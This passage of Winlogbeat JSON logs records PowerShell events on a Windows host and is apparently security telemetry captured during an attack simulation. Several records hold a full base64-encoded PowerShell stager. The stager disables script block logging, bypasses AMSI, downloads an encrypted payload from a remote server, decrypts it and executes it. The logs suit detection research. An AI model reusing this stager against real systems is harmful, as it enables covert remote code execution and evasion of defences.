sAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlAF0AOgA6AEQARQBGAEEAdQBMAHQATgBlAFQAdwBPAFIASwBDAHIARQBEAGUAbgB0AGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQANAAzAGUAZgAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAGUAbQAuAFQAZQB4AFQALgBFAG4AYwBvAGQAaQBOAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAFQAQgBZAHQARQBTACgAJwB+AGsAKgBfAEYAUwBqAHIAOAAlAHgAdwBlAEoANgBoAHwAUABLAC4AZgB7AFUATgBNAEgAdQBkAHAANQB5AG0AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAEQAZQAuAEcARQB0AFMAdAByAGkATgBHACgAWwBDAE8ATgB2AGUAcgBUAF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQgB6AEEARABvAEEATAB3AEEAdgBBAEQARQBBAE0AQQBBAHUAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAeABBAEQAQQBBAE4AZwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQANAAzAEUAZgAzAC4ASABlAEEAZABFAHIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AHoAbwBqADAAdgBDAE0ATwBsAFYAZQByADIARgBJAFMAZgBpAEYAawBSAEMAagBsAHIAOABjAD0AIgApADsAJABEAGEAVABhAD0AJAA0ADMARQBmADMALgBEAE8AdwBuAGwAbwBBAEQARABBAFQAYQAoACQAUwBlAHIAKwAkAFQAKQA7ACQAaQB2AD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABBAD0AJABkAEEAVABBAFsANAAuAC4AJABkAEEAdABBAC4AbABlAE4ARwB0AEgAXQA7AC0AagBvAGkAbgBbAEMASABhAHIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\n\tEngineVersion=5.1.17763.316\n\tRunspaceId=af4eb08f-cf11-45ec-bcd4-8f4fd11c1776\n\tPipelineId=1\n\tScriptName=\n\tCommandLine=            Start-Sleep -Seconds $sleepTime;\n \n\nDetails: \nCommandInvocation(Start-Sleep): \"Start-Sleep\"\nParameterBinding(Start-Sleep): name=\"Seconds\"; value=\"5\"","event_data":{"param3":"CommandInvocation(Start-Sleep): \"Start-Sleep\"\nParameterBinding(Start-Sleep): name=\"Seconds\"; value=\"5\"","param1":"            Start-Sleep -Seconds $sleepTime;","param2":"\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=69926\n\n\tUserId=SHIRE\\nmartha\n\tHostName=ConsoleHost\n\tHostVersion=5.1.17763.316\n\tHostId=9189b674-b66f-4ae4-af64-65d46d4e78e4\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlAF0AOgA6AEQARQBGAEEAdQBMAHQATgBlAFQAdwBPAFIASwBDAHIARQBEAGUAbgB0AGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQANAAzAGUAZgAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAGUAbQAuAFQAZQB4AFQALgBFAG4AYwBvAGQAaQBOAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAFQAQgBZAHQARQBTACgAJwB+AGsAKgBfAEYAUwBqAHIAOAAlAHgAdwBlAEoANgBoAHwAUABLAC4AZgB7AFUATgBNAEgAdQBkAHAANQB5AG0AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAEQAZQAuAEcARQB0AFMAdAByAGkATgBHACgAWwBDAE8ATgB2AGUAcgBUAF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQgB6AEEARABvAEEATAB3AEEAdgBBAEQARQBBAE0AQQBBAHUAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAeABBAEQAQQBBAE4AZwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQANAAzAEUAZgAzAC4ASABlAEEAZABFAHIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AHoAbwBqADAAdgBDAE0ATwBsAFYAZQByADIARgBJAFMAZgBpAEYAawBSAEMAagBsAHIAOABjAD0AIgApADsAJABEAGEAVABhAD0AJAA0ADMARQBmADMALgBEAE8AdwBuAGwAbwBBAEQARABBAFQAYQAoACQAUwBlAHIAKwAkAFQAKQA7ACQAaQB2AD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABBAD0AJABkAEEAVABBAFsANAAuAC4AJABkAEEAdABBAC4AbABlAE4ARwB0AEgAXQA7AC0AagBvAGkAbgBbAEMASABhAHIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\n\tEngineVersion=5.1.17763.316\n\tRunspaceId=af4eb08f-cf11-45ec-bcd4-8f4fd11c1776\n\tPipelineId=1\n\tScriptName=\n\tCommandLine=            Start-Sleep -Seconds $sleepTime;"}}
{"@timestamp":"2019-05-18T20:43:18.285Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"source_name":"Microsoft-Windows-PowerShell","level":"Information","opcode":"To be used when operation is just executing a method","host":{"name":"WECserver"},"activity_id":"{c93a7728-017f-0000-3904-4aca7f01d501}","record_number":"92794","event_data":{"ContextInfo":"        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 9189b674-b66f-4ae4-af64-65d46d4e78e4\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlAF0AOgA6AEQARQBGAEEAdQBMAHQATgBlAFQAdwBPAFIASwBDAHIARQBEAGUAbgB0AGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQANAAzAGUAZgAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAGUAbQAuAFQAZQB4AFQALgBFAG4AYwBvAGQAaQBOAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAFQAQgBZAHQARQBTACgAJwB+AGsAKgBfAEYAUwBqAHIAOAAlAHgAdwBlAEoANgBoAHwAUABLAC4AZgB7AFUATgBNAEgAdQBkAHAANQB5AG0AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAEQAZQAuAEcARQB0AFMAdAByAGkATgBHACgAWwBDAE8ATgB2AGUAcgBUAF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQgB6AEEARABvAEEATAB3AEEAdgBBAEQARQBBAE0AQQBBAHUAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAeABBAEQAQQBBAE4AZwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQANAAzAEUAZgAzAC4ASABlAEEAZABFAHIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AHoAbwBqADAAdgBDAE0ATwBsAFYAZQByADIARgBJAFMAZgBpAEYAawBSAEMAagBsAHIAOABjAD0AIgApADsAJABEAGEAVABhAD0AJAA0ADMARQBmADMALgBEAE8AdwBuAGwAbwBBAEQARABBAFQAYQAoACQAUwBlAHIAKwAkAFQAKQA7ACQAaQB2AD0AJABEAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABBAD0AJABkAEEAVABBAFsANAAuAC4AJABkAEEAdABBAC4AbABlAE4ARwB0AEgAXQA7AC0AagBvAGkAbgBbAEMASABhAHIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\n        Engine Version = 5.1.17763.316\n        Runspace ID = af4eb08f-cf11-45ec-bcd4-8f4fd11c1776\n        Pipeline ID = 1\n        Command Name = Start-Sleep\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 69927\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell","Payload":"CommandInvocation(Start-Sleep): \"Start-Sleep\"\nParameterBinding(Start-Sleep): name=\"Seconds\"; value=\"5\""},"event_id":4103,"user":{"name":"nmartha","domain":"SHIRE","type":"User","identifier":"S-1-5-21-2511471446-1103646877-3980648787-1106"},"computer_name":"HR001.shire.com","thread_id":5812,"version":1,"log_name":"Microsoft-Windows-PowerShell/Operational","message":"CommandInvocation(Start-Sleep): \"Start-Sleep\"\nParameterBinding(Start-Sleep): name=\"Seconds\"; value=\"5\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 9189b674-b66f-4ae4-af64-65d46d4e78e4\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYA